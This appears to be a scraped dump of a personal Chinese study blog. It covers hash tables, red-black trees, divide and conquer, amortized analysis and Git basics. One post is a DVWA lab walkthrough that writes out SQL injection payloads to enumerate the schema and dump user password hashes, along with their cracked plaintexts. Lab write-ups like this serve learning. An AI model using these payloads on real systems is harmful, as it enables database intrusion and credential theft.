be used to map data of arbitrary size to data of fixed size. The values returned by a hash function are called hash values, hash codes, digests, or simply hashes. One use is a data structure called a hash table, widely used in computer software for rapid data lookup. Hash functions accelerate table or database lookup by detecting duplicated records in a large file. 1.2.1 哈希函数性质一个好的哈希函数通常需要满足下列属性。当然，一个哈希函数要满足哪些性质，还要看具体的应用决定。DeterminismUniformityDefined rangeVariable rangeData normalizationContinuityNon-invertible. 关于哈希函数的若干性质，参见Hash Function 维基百科 1.2.2 哈希函数的选择存在着很多各种各样的哈希函数，这些函数都不尽相同。对于特定的应用而言，如何选取合适的哈希函数是一个重要的问题。函数的选择强烈依赖于输入数据的性质, 以及它们在预期应用程序中的概率分布。[3] Trivial hash function 平凡哈希函数，Perfect hashing 完美哈希，Minimal perfect hashing，最小完美哈希，Hashing uniformly distributed data 哈希均匀分布数据，Universal hashing,Rolling hash …等等。具体描述参见Hash Function 维基百科 下面对PHF,与MPHF作进一步学习。当键值是【static(即固定不变)】的时候，我们可以涉及方案使得最差情况下的查询性能也很出色。由此引入了 PHF 最坏时间O(1), 与MPHF 最坏时间O(1),空间O(n)。 1.2.3 Perfect Hash Function (PHF)?即【沒有冲突】的哈希函数[2] no collisions即：[5] 函数 Hash 将 N 个 Key 值映射到 M 个整数上，这里 M&gt;=N 对于任意的 Key1 ，Key2 ， Hash( Key1 ) != Hash( Key2 ) 如何construct? 见[4] 拓展： Dynamic perfect hashing 【动态完美哈希函数】 Minimal perfect hash function 【最小完美哈希函数 】 Order preservation 【保序最小完美哈希函数】 key I &lt; key J 等价于 Hash(key I ) &lt; Hash(key J ) 满足 Minimal perfect hash function 1.2.4 Minimal Perfect Hash Function (MPHF)?在1.2.3 Perfect Hash Function (PHF)中，若M==N,则为MPHF. 123维基百科[4]:A minimal perfect hash function is a perfect hash function that maps n keys to nconsecutive integers – usually the numbers from 0 to n − 1 or from 1 to n 123456789101112NOTE:静态[5]通常情况下，PHF或MPHF是针对静态集合的。也就是，在使用PHF或MPHF时，所有的 KEY 值是事先已知并且固定的。不过，这里有针对动态集合的一个算法（我没有仔细看，不敢肯定）[6]缺点：一是必须事前必须知道原数据集，二是需要花一定的CPU来生成这个函数。我认为，对于数据仓库类的线下搜索应用，这个算法是有用武之地的。但对于强调实时的数据业务，这个算法是不适合的。 1.3 什么是哈希表[7] ?哈希表是一种基于键-值(key-index) 的数据结构。哈希表通过哈希函数实现key , index的转换。 123456[7]Selected From Wiki-Hash Table : In computing, a hash table (hash map) is a data structure which implements an associative array abstract data type, a structure that can map keys to values. A hash table uses a hash function to compute an index into an array of buckets orslots, from which the desired value can be found. 在很多情况下，哈希表在平均性能上【优于】 搜索树以及 table lookup structure。因此哈希表在计算机领域中得到广泛应用，尤其是涉及数组，数据库索引，Cache和Set. 1.3.1 Key statistics load factor = n/k n is the number of entries k is the number of slots load factor 过大，冲突可能性增加；load factor 过小，空间的浪费。 1.3.2 Dynamic Resizing动态调整大小 123For example, in Java&apos;s HashMap class the default load factor threshold fortable expansion is 3/4 and in Python&apos;s dict, table size is resized when load factor is greater than 2/3 1.3.3 Rehashing O(n) 1.4 冲突冲突问题优于哈希函数不一定是完美哈希函数或者是slots过少，因此可能会导致冲突发生，产生冲突可以有多重方法加以解决。 解决办法 分离链接法 开放定址法 线性探测 平凡探测 Rehash 1.4 性能[7]In the simplest model, the hash function is completely unspecified and the table does not resize. For the best possible choice of hash function, a table of size k with open addressing has no collisions and holds up to k elements, with a single comparison for successful lookup, and a table of size k with chaining and n keys has the minimum max(0, n − k) collisions and O(1 + n/k) comparisons for lookup. For the worst choice of hash function, every insertion causes a collision, and hash tables degenerate to linear search, with Ω(n) amortized comparisons per insertion and up to n comparisons for a successful lookup. Adding rehashing to this model is straightforward. As in a dynamic array, geometric resizing by a factor of b implies that only n/bi keys are inserted i or more times, so that the total number of insertions is bounded above by bn/(b − 1), which is O(n). By using rehashing to maintain n &lt; k, tables using both chaining and open addressing can have unlimited elements and perform successful lookup in a single comparison for the best choice of hash function. In more realistic models, the hash function is a random variable over a probability distribution of hash functions, and performance is computed on average over the choice of hash function. When this distribution is uniform, the assumption is called “simple uniform hashing” and it can be shown that hashing with chaining requires Θ(1 + n/k) comparisons on average for an unsuccessful lookup, and hashing with open addressing requires Θ(1/(1 − n/k)).[25] Both these bounds are constant, if we maintain n/k &lt; c using table resizing, where c is a fixed constant less than 1. 1.5 Implementation 实现1.5.1 PHF以及MPHF的实现关于PHF以及MPHF的实现，这位博主已经给了较好的总结，我不认为我可以比他总结的更好。于是就照搬过来吧。参见 ：完美哈希函数（Perfect Hash Function） 的【PHF和MPHF生成程序库】以及【PHF和MPHF生成算法】部分。 1.5.2 Java Python 实现待续 1.6 应用 Applications待续 1.7 總結 Summary哈希表作为常数平均时间查询与插入的数据结构。采用哈希函数实现。哈希函数常常是不完美的因此会产生冲突问题，对此也有一系列的解决方法。哈希表也可以动态调整。完美哈希函数在一些库中已经得到了较好的实现。哈希表在Java等编程语言中也得到了实现。哈希表作为一个优秀的数据结构在计算机科学的很多领域都发挥着重要的作用。 1.8 References &amp; External LinksReferences[1] 数据结构与算法-C语言描述[Mark Allen Weiss] Chapter 5 [2] Hash Table维基百科 [3] Hash Function 维基百科 [4] Perfect Hash Function维基百科 [5] 完美哈希函数（Perfect Hash Function）- Blog [6] 最小完美哈希函数简介-Blog [7] Hash_table维基百科 External LinksDistributed hash table Calculate hash of a given value by Timo Denk","categories":[{"name":"data structures","slug":"data-structures","permalink":"http://yoursite.com/categories/data-structures/"}],"tags":[{"name":"data structures","slug":"data-structures","permalink":"http://yoursite.com/tags/data-structures/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://yoursite.com/tags/Hash-Table/"}]},{"title":"","slug":"未命名文件夹/Hash 入门","date":"2018-04-19T12:43:00.000Z","updated":"2018-05-06T13:48:50.000Z","comments":true,"path":"2018/04/19/未命名文件夹/Hash 入门/","link":"","permalink":"http://yoursite.com/2018/04/19/未命名文件夹/Hash 入门/","excerpt":"","text":"目录1.1 什么是哈希Hash 1.2 哈希函数 Hash Function 1.2.1 哈希函数性质 1.2.2 哈希函数的选择 1.2.3 Perfect Hash Function (PHF) 1.2.4 Minimal Perfect Hash Function (MPHF) [Note] 1.3 什么是哈希表 Hash Table 1.3.1 Key statistics 1.3.2 Dynamic Resizing 1.3.3 ReHashing 1.4 冲突 Collsion 1.4 性能 1.5 哈希表的实现 Implementation 1.5.1 PHF以及MPHF的实现 1.5.2 Java Python 实现 1.6 应用 Applications 1.7 總結 Summary 1.7 References &amp; External Links 1.1 什么是哈希Hash？哈希表的实现 称之为 哈希，抑或 散列。(雜湊 For 台灣 )哈希表在【平均】情况下以常数时间constant time 执行「插入」，「删除」和「查找」的技术。 12为什么平均O(1)？原理？最坏情况下呢？ O(n) 为什么？ 但是对于元素间的【排序】操作将不会得到有效的支持。譬如FindMax,FindMin以及按序打印元素都是散列表所不支持的。[1] 哈希/散列 接收一个值，输出这个值的哈希值 维基百科[2]中有一段对其的介绍： 1234Selected From Wiki-Hash Table [2]: The idea of hashing is to distribute the entries (key/value pairs) across an array of buckets. Given a key, the algorithm computes an index that suggests where the entry can be found. 1.2 哈希函数 Hash Function ？哈希函数是可以将【任意大小】的数据映射为【固定】大小数据的一个函数。其返回数据的哈希值。哈希函数的一个用处是用来实现哈希表Hash Table. 哈希表在计算机科学中被广泛应用以提高查询性能。哈希函数在密码学，Cache , 布隆过滤器，等中也有所应用。[3] 关于具体的哈希函数，请参见List of hash_functions 12345维基百科[3]： A hash function is any function that can be used to map data of arbitrary size to data of fixed size. The values returned by a hash function are called hash values, hash codes, digests, or simply hashes. One use is a data structure called a hash table, widely used in computer software for rapid data lookup. Hash functions accelerate table or database lookup by detecting duplicated records in a large file. 1.2.1 哈希函数性质一个好的哈希函数通常需要满足下列属性。当然，一个哈希函数要满足哪些性质，还要看具体的应用决定。DeterminismUniformityDefined rangeVariable rangeData normalizationContinuityNon-invertible. 关于哈希函数的若干性质，参见Hash Function 维基百科 1.2.2 哈希函数的选择存在着很多各种各样的哈希函数，这些函数都不尽相同。对于特定的应用而言，如何选取合适的哈希函数是一个重要的问题。函数的选择强烈依赖于输入数据的性质, 以及它们在预期应用程序中的概率分布。[3] Trivial hash function 平凡哈希函数，Perfect hashing 完美哈希，Minimal perfect hashing，最小完美哈希，Hashing uniformly distributed data 哈希均匀分布数据，Universal hashing,Rolling hash …等等。具体描述参见Hash Function 维基百科 下面对PHF,与MPHF作进一步学习。当键值是【static(即固定不变)】的时候，我们可以涉及方案使得最差情况下的查询性能也很出色。由此引入了 PHF 最坏时间O(1), 与MPHF 最坏时间O(1),空间O(n)。 1.2.3 Perfect Hash Function (PHF)?即【沒有冲突】的哈希函数[2] no collisions即：[5] 函数 Hash 将 N 个 Key 值映射到 M 个整数上，这里 M&gt;=N 对于任意的 Key1 ，Key2 ， Hash( Key1 ) != Hash( Key2 ) 如何construct? 见[4] 拓展： Dynamic perfect hashing 【动态完美哈希函数】 Minimal perfect hash function 【最小完美哈希函数 】 Order preservation 【保序最小完美哈希函数】 key I &lt; key J 等价于 Hash(key I ) &lt; Hash(key J ) 满足 Minimal perfect hash function 1.2.4 Minimal Perfect Hash Function (MPHF)?在1.2.3 Perfect Hash Function (PHF)中，若M==N,则为MPHF. 123维基百科[4]:A minimal perfect hash function is a perfect hash function that maps n keys to nconsecutive integers – usually the numbers from 0 to n − 1 or from 1 to n 123456789101112NOTE:静态[5]通常情况下，PHF或MPHF是针对静态集合的。也就是，在使用PHF或MPHF时，所有的 KEY 值是事先已知并且固定的。不过，这里有针对动态集合的一个算法（我没有仔细看，不敢肯定）[6]缺点：一是必须事前必须知道原数据集，二是需要花一定的CPU来生成这个函数。我认为，对于数据仓库类的线下搜索应用，这个算法是有用武之地的。但对于强调实时的数据业务，这个算法是不适合的。 1.3 什么是哈希表[7] ?哈希表是一种基于键-值(key-index) 的数据结构。哈希表通过哈希函数实现key , index的转换。 123456[7]Selected From Wiki-Hash Table : In computing, a hash table (hash map) is a data structure which implements an associative array abstract data type, a structure that can map keys to values. A hash table uses a hash function to compute an index into an array of buckets orslots, from which the desired value can be found. 在很多情况下，哈希表在平均性能上【优于】 搜索树以及 table lookup structure。因此哈希表在计算机领域中得到广泛应用，尤其是涉及数组，数据库索引，Cache和Set. 1.3.1 Key statistics load factor = n/k n is the number of entries k is the number of slots load factor 过大，冲突可能性增加；load factor 过小，空间的浪费。 1.3.2 Dynamic Resizing动态调整大小 123For example, in Java&apos;s HashMap class the default load factor threshold fortable expansion is 3/4 and in Python&apos;s dict, table size is resized when load factor is greater than 2/3 1.3.3 Rehashing O(n) 1.4 冲突冲突问题优于哈希函数不一定是完美哈希函数或者是slots过少，因此可能会导致冲突发生，产生冲突可以有多重方法加以解决。 解决办法 分离链接法 开放定址法 线性探测 平凡探测 Rehash 1.4 性能[7]In the simplest model, the hash function is completely unspecified and the table does not resize. For the best possible choice of hash function, a table of size k with open addressing has no collisions and holds up to k elements, with a single comparison for successful lookup, and a table of size k with chaining and n keys has the minimum max(0, n − k) collisions and O(1 + n/k) comparisons for lookup. For the worst choice of hash function, every insertion causes a collision, and hash tables degenerate to linear search, with Ω(n) amortized comparisons per insertion and up to n comparisons for a successful lookup. Adding rehashing to this model is straightforward. As in a dynamic array, geometric resizing by a factor of b implies that only n/bi keys are inserted i or more times, so that the total number of insertions is bounded above by bn/(b − 1), which is O(n). By using rehashing to maintain n &lt; k, tables using both chaining and open addressing can have unlimited elements and perform successful lookup in a single comparison for the best choice of hash function. In more realistic models, the hash function is a random variable over a probability distribution of hash functions, and performance is computed on average over the choice of hash function. When this distribution is uniform, the assumption is called “simple uniform hashing” and it can be shown that hashing with chaining requires Θ(1 + n/k) comparisons on average for an unsuccessful lookup, and hashing with open addressing requires Θ(1/(1 − n/k)).[25] Both these bounds are constant, if we maintain n/k &lt; c using table resizing, where c is a fixed constant less than 1. 1.5 Implementation 实现1.5.1 PHF以及MPHF的实现关于PHF以及MPHF的实现，这位博主已经给了较好的总结，我不认为我可以比他总结的更好。于是就照搬过来吧。参见 ：完美哈希函数（Perfect Hash Function） 的【PHF和MPHF生成程序库】以及【PHF和MPHF生成算法】部分。 1.5.2 Java Python 实现待续 1.6 应用 Applications待续 1.7 總結 Summary哈希表作为常数平均时间查询与插入的数据结构。采用哈希函数实现。哈希函数常常是不完美的因此会产生冲突问题，对此也有一系列的解决方法。哈希表也可以动态调整。完美哈希函数在一些库中已经得到了较好的实现。哈希表在Java等编程语言中也得到了实现。哈希表作为一个优秀的数据结构在计算机科学的很多领域都发挥着重要的作用。 1.8 References &amp; External LinksReferences[1] 数据结构与算法-C语言描述[Mark Allen Weiss] Chapter 5 [2] Hash Table维基百科 [3] Hash Function 维基百科 [4] Perfect Hash Function维基百科 [5] 完美哈希函数（Perfect Hash Function）- Blog [6] 最小完美哈希函数简介-Blog [7] Hash_table维基百科 External LinksDistributed hash table Calculate hash of a given value by Timo Denk","categories":[],"tags":[]},{"title":"","slug":"未命名文件夹/SQL-injection","date":"2018-04-13T09:22:43.000Z","updated":"2018-04-26T07:34:54.000Z","comments":true,"path":"2018/04/13/未命名文件夹/SQL-injection/","link":"","permalink":"http://yoursite.com/2018/04/13/未命名文件夹/SQL-injection/","excerpt":"","text":"#Level 1 ##step1 嘗試 輸入1獲取姓名 輸入 1 and 1=1 輸入：1’ and ‘1’ = ‘1語法錯誤 猜測無任何過濾 觀察源代碼：的確無任何過濾 ##step2 獲取數據庫信息 獲取數據庫名，輸入：1 union select 1 ,database()# 獲取數據庫名稱為dvwa 獲取表名，輸入：1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #得知dvwa中由兩張表，guestbook,users 獲取字段名，輸入：1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#字段名為user_id,first_name,last_name,user,password,avatar ##step3 抓取密碼 輸入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #21232f297a57a5a743894a0e4a801fc3,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99md5解碼后為：admin,abc123,charley,letmein,password #Level 21’ and ‘1’ = ‘1 1’ union select 1 ,database()# 源代碼 1’ select 1, database()# 1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’# 1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 1’ union select 1 , concat(user,password) from users#","categories":[],"tags":[]},{"title":"分值策略","slug":"分值策略","date":"2018-01-01T16:00:10.000Z","updated":"2018-01-01T16:00:10.000Z","comments":true,"path":"2018/01/02/分值策略/","link":"","permalink":"http://yoursite.com/2018/01/02/分值策略/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"函数的增长","slug":"函数的增长","date":"2018-01-01T15:59:08.000Z","updated":"2018-01-01T15:59:08.000Z","comments":true,"path":"2018/01/01/函数的增长/","link":"","permalink":"http://yoursite.com/2018/01/01/函数的增长/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"第12章二叉检索树","slug":"第12章二叉检索树","date":"2017-11-10T04:22:59.000Z","updated":"2018-01-02T14:46:22.000Z","comments":true,"path":"2017/11/10/第12章二叉检索树/","link":"","permalink":"http://yoursite.com/2017/11/10/第12章二叉检索树/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"第13章 红黑树","slug":"第13章红黑树","date":"2017-11-10T04:14:52.000Z","updated":"2017-11-10T05:35:53.000Z","comments":true,"path":"2017/11/10/第13章红黑树/","link":"","permalink":"http://yoursite.com/2017/11/10/第13章红黑树/","excerpt":"13.1 Propery of black-red tree 红黑树是一种特殊的二叉检索树，它的每一个节点附加有一个color属性，其值为black或者是red。 且满足以下五个性质： 每一个节点的color属性要么是红，要么是黑。 根节点是黑色的。 叶子节点都是NIL，而且都是黑色的。 两个红色的节点不可能是父子关系。 对于任何一个节点，从该节点出发到它的所有子孙叶子节点的这一段路径中，所经过的黑色节点的个数相同。","text":"13.1 Propery of black-red tree 红黑树是一种特殊的二叉检索树，它的每一个节点附加有一个color属性，其值为black或者是red。 且满足以下五个性质： 每一个节点的color属性要么是红，要么是黑。 根节点是黑色的。 叶子节点都是NIL，而且都是黑色的。 两个红色的节点不可能是父子关系。 对于任何一个节点，从该节点出发到它的所有子孙叶子节点的这一段路径中，所经过的黑色节点的个数相同。 黑高bh(x) [不包含x自身以及为NIL的叶子节点] 引理 13.1 一个有n个内部节点的红黑树高度至多有2lg(n+1) * prove * 首先由归纳法证明任意节点x，它的字数中，至少包含2^bh(x)-1个内部节点 13.2 旋转 O(1)13.3 插入 O(logn)","categories":[{"name":"CLRS","slug":"CLRS","permalink":"http://yoursite.com/categories/CLRS/"}],"tags":[{"name":"红黑树","slug":"红黑树","permalink":"http://yoursite.com/tags/红黑树/"}]},{"title":"第1，2，3章-算法基础以及渐进符号","slug":"第1，2，3章-算法基础以及渐进符号","date":"2017-11-08T11:05:37.000Z","updated":"2017-11-08T11:05:37.000Z","comments":true,"path":"2017/11/08/第1，2，3章-算法基础以及渐进符号/","link":"","permalink":"http://yoursite.com/2017/11/08/第1，2，3章-算法基础以及渐进符号/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"第4章-分治策略","slug":"第4章-分治策略","date":"2017-11-08T11:04:08.000Z","updated":"2017-11-08T11:04:09.000Z","comments":true,"path":"2017/11/08/第4章-分治策略/","link":"","permalink":"http://yoursite.com/2017/11/08/第4章-分治策略/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"第6，7，8，9章-排序","slug":"第6，7，8，9章-排序","date":"2017-11-08T11:03:31.000Z","updated":"2017-11-08T11:03:31.000Z","comments":true,"path":"2017/11/08/第6，7，8，9章-排序/","link":"","permalink":"http://yoursite.com/2017/11/08/第6，7，8，9章-排序/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"第16章-贪心算法","slug":"第16章-贪心算法","date":"2017-11-08T11:02:07.000Z","updated":"2017-11-10T05:23:16.000Z","comments":true,"path":"2017/11/08/第16章-贪心算法/","link":"","permalink":"http://yoursite.com/2017/11/08/第16章-贪心算法/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"第15章-动态规划","slug":"第15章-动态规划","date":"2017-11-08T11:01:44.000Z","updated":"2017-11-10T05:23:13.000Z","comments":true,"path":"2017/11/08/第15章-动态规划/","link":"","permalink":"http://yoursite.com/2017/11/08/第15章-动态规划/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"分治法应用宝典","slug":"分治法应用宝典","date":"2017-11-08T10:42:56.000Z","updated":"2018-04-19T18:01:50.000Z","comments":true,"path":"2017/11/08/分治法应用宝典/","link":"","permalink":"http://yoursite.com/2017/11/08/分治法应用宝典/","excerpt":"大整数的乘法 分治法 X=a×2^(n/2)+bY=c×2^(n/2)+d XY=（a×2^(n/2)+b ）×（c×2^(n/2)+d）即 ac×2^n+(bc+ad)×2^(n/2)+bd 所以有T(n)=4T(n/2)+O(n),T(1)=O(1) T(n)=O(n^2)同暴力解法时间复杂度相同","text":"大整数的乘法 分治法 X=a×2^(n/2)+bY=c×2^(n/2)+d XY=（a×2^(n/2)+b ）×（c×2^(n/2)+d）即 ac×2^n+(bc+ad)×2^(n/2)+bd 所以有T(n)=4T(n/2)+O(n),T(1)=O(1) T(n)=O(n^2)同暴力解法时间复杂度相同 XY = ac×2^n - ((a-b)(c-d)-ac-bd)× 2^n/2 + bdXY = ac×2^n + ((a+b)(c+d)-ac-bd)×2^n/2 + bd T(n)=3T(n/2)+O(n) T(1)=O(1) T(n)=O(n^log3)=O(n^1.59) DFT快速傅里叶变换 O(nlgn) 至今未找到现行时间的算法 strassen矩阵相乘 暴力解法 O(n^3) strassen O(n^log7) 残缺棋盘问题to be continued 最近点对to be continued 快速傅里叶变换to be continued","categories":[{"name":"CLRS","slug":"CLRS","permalink":"http://yoursite.com/categories/CLRS/"}],"tags":[{"name":"algorithms","slug":"algorithms","permalink":"http://yoursite.com/tags/algorithms/"}]},{"title":"第十七章  摊还分析","slug":"Amortized-Analysis","date":"2017-11-03T15:37:53.000Z","updated":"2017-11-08T10:45:33.000Z","comments":true,"path":"2017/11/03/Amortized-Analysis/","link":"","permalink":"http://yoursite.com/2017/11/03/Amortized-Analysis/","excerpt":"what is 摊还分析 即求数据结构的一个操作序列中所执行所有操作的平均时间。 不考虑概率，保证最坏情况下每个操作的平均性能 Methods aggregate analysis 聚合分析 counting method 核算法 potential method 势能法","text":"what is 摊还分析 即求数据结构的一个操作序列中所执行所有操作的平均时间。 不考虑概率，保证最坏情况下每个操作的平均性能 Methods aggregate analysis 聚合分析 counting method 核算法 potential method 势能法 17.1聚合分析 聚合分析令每个操作的摊还代价相等。算出n个操作的总时间上界T(n),则每个操作的的摊还代价是T(n)/n For example: 栈操作 PUSH,POP,POP(k) n个操作的代价之至多是O(n) 为什么？每个操作的摊还代价是O(n)/n=O(1) 二进制计数器递增 Increment T(n)=O(n) O(n)/n=O(1) 17.2 accounting method credit accounting method 为每一种操作分配一个摊还代价c。对于n个操作，若当操作的实际代价real小于摊还代价，则结余credit,为c-real; 若当前操作的实际代价real小于摊还代价，则从之前存储的credit中取出real-c For example: 栈操作 | |分配摊还代价 | 实际代价 | —|———|——– |PUSH | 2 | 1 | |POP |0 | 1 || POP(k)| 0 | k | 则每一次PUSH操作，摊还代价一个用于实际代价，一个存入credit，用于pop时使用、 每一个栈中的值都具有一个额外的credit pop指令，使用已经存储的一个credit 二进制计数递增器 略 17.3 potential method 略略略习题解答 solutions for CLRS 链接:http://pan.baidu.com/s/1mikmehU 密码:pbon 17.1.1 O(k) 考虑最坏情形即为此 17.1.2 略 17.1.3 求和即可 17.2.1 push 2 1pop+1copy pop pop(k) 0 17.2.2 设摊还代价为0，若i is a power of 2 其他情况下，摊还代价为2，即可 17.2.3 略 17.3.1 设𝞥’(Di)=𝞥(Di)-𝞥(Di-1),𝞥(0)=0即可 17.3.2 略 17.3.3 设𝞥(D)=nlgn 17.3.4O(n) + sn-s0 本章余略","categories":[{"name":"CLRS","slug":"CLRS","permalink":"http://yoursite.com/categories/CLRS/"}],"tags":[{"name":"algorithms","slug":"algorithms","permalink":"http://yoursite.com/tags/algorithms/"}]},{"title":"web mining","slug":"mining","date":"2017-11-03T15:36:50.000Z","updated":"2017-11-08T11:06:45.000Z","comments":true,"path":"2017/11/03/mining/","link":"","permalink":"http://yoursite.com/2017/11/03/mining/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Git docs学习笔记","slug":"Git-docs学习笔记","date":"2017-10-30T14:41:50.000Z","updated":"2017-10-31T12:08:06.000Z","comments":true,"path":"2017/10/30/Git-docs学习笔记/","link":"","permalink":"http://yoursite.com/2017/10/30/Git-docs学习笔记/","excerpt":"1.1 起步-关于版本控制 什么是版本控制系统(version control system.VCS)? 版本控制是一种记录一个或者若干个文件内容的变化，以便将来查阅特定版本修改情况的系统。版本控制系统可以对任何类型的文件进行版本控制，但大多数情况下开发者是对源代码文件作版本控制。 有哪些类型的版本控制系统？ 本地版本控制系统","text":"1.1 起步-关于版本控制 什么是版本控制系统(version control system.VCS)? 版本控制是一种记录一个或者若干个文件内容的变化，以便将来查阅特定版本修改情况的系统。版本控制系统可以对任何类型的文件进行版本控制，但大多数情况下开发者是对源代码文件作版本控制。 有哪些类型的版本控制系统？ 本地版本控制系统 它的工作原理是在硬盘上保存补丁集，所谓补丁是指文件修订前后的变化；通过应用所有的补丁，可以重新计算出各个版本的内容。 集中式版本控制系统 本地版本控制系统只适用于单个开发者。 遇到需要多个开发者协同工作的时候，本地版本控制系统就没用了。于是集中式的版本控制系统（centralized version control system,CVCS）应运而生。这类系统，诸如CVS,Subveision,Perforce等，都有一个单一的几种管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连接到这一台服务器，取出最心底额文件或者提交更新，多年以来，这已经成为版本控制系统的标准做法。 这种做法带来了很多好好粗，特别是相对于老式的本地CVS来说。每个人都可以在一定程度智商看到项目中其他人在做什么。而管理员也可以轻松掌握每个开发者的权限，并且管理一个cvcs要远比在各个客户端上维护本地数据库来的轻松容易。 这种做法最显而易见的缺点是中央服务器的故障，如果宕机一小时，那么在这一小时内，谁都无法更新，也都无法协同工作。如果中心数据库磁盘发生损坏，又没有做恰当备份，毫无疑问，将丢失所有的数据-包括项目的真个变更历史，只剩下各自机器上保留的单独快照。本地版本控制也存在这样的问题，只要项目的历史记录都被保存在同一个位置，就会有丢失所有历史记录的风险。 分布式版本控制系统 于是分布式版本控制系统（distributed version control system，DVCS）面世了，在这类系统中，像Git,Mercurial,Bazar,darcs等，客户端并不只提取最新版本的文件快照，而是把整个代码仓库完整的镜像下来，这么一来，任何一处系统工作用的服务器发生故障，事后都可以 用任何一个镜像出来的本地仓库恢复，因为每一次克隆操作都是一次对代码仓库的完整备份。 1.2 起步-Git简史同生活中很多伟大的事物一样，Git诞生于一个极富纷争大举创新的时代。Linux内核开源项目有着为数众多的参与者，绝大多数Linux内核维护工作都花在提交补丁和保存归档的繁琐事务上（1991-2002年间）、到2002年，整个项目组开始启动一个专有的分布式版本控制系统Bitkeeper来管理和维护代码。到了2005年，开发bitkeeper的商业公司同Linux内核开源社区的合作关系结束，他们收回了Linux内核社区免费试用bitkeepr的权力，这就迫使Linux开源社区特别是Linux的缔造者linus torvalds基于bitkeeper是的经验与教训，开发出自己的版本控制系统，他们对新的系统制定了若干目标: 速度 简单的设计 对非线性开发模式的强力支持 完全分布式 有能力高效管理类似Linux内核一样的超大规模的项目 自诞生于2005年以来，Git日臻完善成熟，在高度易用的同时，仍然保留着初期设立的目标，它的速度飞快，极其适合管理大项目，有着令人难以置信的非线性管理系统。 1.3 起步-Git基础 Git和其他版本控制系统的主要差别在于对待数据的方法。其他系统将他们保存的信息看作是一组基本文件和每个文件随时间逐步积累的差异。 而Git不按照以上方式对待或者保存数据，Git对待数据更像是一个快照流 近乎所有操作都可以本地执行 Git保证完整性 Git的所有数据在存储之前都计算校验和，然后以校验和来引用，这意味着不可以在Git不知情的情况下，更改任何文件或者目录内容，这个功能建构再给他底层，是构成Git哲学不可或缺的部分，若你在传送过程中，中丢失信息或损坏文件，Git就能发现。 Git用以计算校验和的机制叫做SHA-1散列（hash，哈希）。这是一个由四十个十六进制字符组成的字符串，基于Git文件的内容或者目录计算出来。SHA-1看起来是这样： 24b9da6552252987aa493b52f8696cd6d3b00373 Git中使用这种哈希值的情况很多，你将经常看到这种哈希值。实际上，Git数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。 Git一般只添加数据 你执行的Git操作 ，几乎只往Git数据库中添加数据。很难让Git执行任何不可逆操作，或者让他以任何方式清除数据。同别的vcs一样，未提交更新时有可能丢失或弄乱修改的内容，但是一旦你提交快照到Git中，就难以再丢失数据，特别是，你定期的推送数据库到其他的数据库的话。 这使得我们使用Git成为一个安心愉悦的过程，因为我们甚至可以尽情的做各种尝试，而没有把事情弄糟的风险。 三种状态 Git有三种状态，你的文件可以处于其中之一，已提交（commited),已修改（modified），和已暂存（staged)。 Git 仓库目录是 Git 用来保存项目的元数据和对象数据库的地方。 这是 Git 中最重要的部分，从其它计算机克隆仓库时，拷贝的就是这里的数据。 工作目录是对项目的某个版本独立提取出来的内容。 这些从 Git 仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。 暂存区域是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中。 有时候也被称作`‘索引’’，不过一般说法还是叫暂存区域。 基本的 Git 工作流程如下： 在工作目录中修改文件。 *暂存文件，将文件的快照放入暂存区域。 提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录。 如果 Git 目录中保存着的特定版本文件，就属于已提交状态。 如果作了修改并已放入暂存区域，就属于已暂存状态。 如果自上次取出后，作了修改但还没有放到暂存区域，就是已修改状态。 在Git 基础一章，你会进一步了解这些状态的细节，并学会如何根据文件状态实施后续操作，以及怎样跳过暂存直接提交。 1.4 起步-命令行1.5 起步-安装Git1.6 初次运行Git前的配置git自带一个git config的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置： –system 此电脑–global 此用户–local 此仓库 /etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 –system 选项的 git config 时，它会从此文件读写配置变量。 ~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 –global 选项让 Git 读写此文件。 当前使用仓库的 Git 目录中的 config 文件（就是 .git/config）：针对该仓库。 –local 每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。 用户信息当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改： git config –global user.name “John Doe”git config –global user.email johndoe@example.com 再次强调，如果使用了 –global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 –global 选项的命令来配置。 文本编辑器既然用户信息已经设置完毕，你可以配置默认文本编辑器了，当 Git 需要你输入信息时会调用它。 如果未配置，Git 会使用操作系统默认的文本编辑器，通常是 Vim。 如果你想使用不同的文本编辑器，例如 Emacs，可以这样做： git config –global core.editor emacs 检查配置信息如果想要检查你的配置，可以使用 git config –list 命令来列出所有 Git 当时能找到的配置。 git config –listuser.name=John Doeuser.email=johndoe@example.comcolor.status=autocolor.branch=autocolor.interactive=autocolor.diff=auto 你可能会看到重复的变量名，因为 Git 会从不同的文件中读取同一个配置（例如：/etc/gitconfig 与 ~/.gitconfig）。 